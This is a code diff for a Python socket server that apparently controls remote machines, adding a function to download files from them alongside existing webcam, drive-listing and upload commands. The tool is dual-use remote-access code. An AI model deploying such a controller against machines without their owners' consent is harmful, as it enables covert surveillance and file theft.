@@ -41,7 +41,7 @@ def send(connection, data):
          client.send(data.encode())
          
    except (IndexError, AttributeError, socket.error, socket.timeout):
-      return None
+      return str()
 
 def receive(connection, decode=True, buffer=1024):
    try:
@@ -59,7 +59,7 @@ def receive(connection, decode=True, buffer=1024):
       return data.decode() if decode else data
    
    except (UnicodeDecodeError, IndexError, AttributeError, socket.error):
-      return None
+      return str()
    
 def receive_all(connection, decode=True, buffer=1024):
    try:
@@ -80,7 +80,7 @@ def receive_all(connection, decode=True, buffer=1024):
       return data.decode() if decode else data
 
    except (IndexError, AttributeError, socket.error, socket.timeout):
-      return None
+      return str()
 
 def send_and_receive(connection, data, provideSize=False, decode=True):
    try:
@@ -110,7 +110,7 @@ def send_and_receive(connection, data, provideSize=False, decode=True):
       return data.decode() if decode else data
 
    except (IndexError, AttributeError, socket.error, socket.timeout):
-      return None
+      return str()
 
 def isConnected(connection):
    try:
@@ -221,6 +221,7 @@ def Webcam(connection):
 def GetDrives(connection):
    response = send_and_receive(connection, 'drives')
    if ('drives' in response):
+      send(connection, 'ok')
       drives = receive(connection)
       return drives
    
@@ -253,13 +254,6 @@ def UploadFile(connection, path, fileName, data):
    response = send_and_receive(connection, 'upload-file')
 
    if ('upload-file' in response):
-      if (path.startswith('\\') or path.startswith('/')):
-         path = f'C:{path}'
-
-      details = f'{fileName}\n{path}\n{len(data)}'
-      print(details.split('\n'))
-
-      """
       send(connection, path)
       receive(connection)
 
@@ -271,14 +265,34 @@ def UploadFile(connection, path, fileName, data):
 
       if ('file-creation-failed' in folderState):
          return False
-
+      
       send(connection, data)
       status = receive(connection)
 
-      print(status)
-
       return True if ('file-uploaded' in status) else False
-      """
+   
+   return None
+
+def DownloadFile(connection, path):
+   response = send_and_receive(connection, 'download-file')
+
+   if ('download-file' in response):
+      send(connection, path)
+      fileExists = receive(connection)
+
+      if ('file-not-exist' in fileExists):
+         return None
+
+      send(connection, 'ok')
+      fileSize = receive(connection)
+
+      if (len(fileSize) < 1):
+         return None
+
+      send(connection, 'ok')
+      data = receive_all(connection, False, int(fileSize))
+      
+      return base64.b64encode(data)
    
    return None
    
@@ -369,6 +383,7 @@ webapi.api.Webcam = Webcam
 webapi.api.GetDrives = GetDrives
 webapi.api.GetFiles = GetFiles
 webapi.api.UploadFile = UploadFile
+webapi.api.DownloadFile = DownloadFile
 
 server_thread = threading.Thread(target=start_websocket_server)
 server_thread.daemon = True
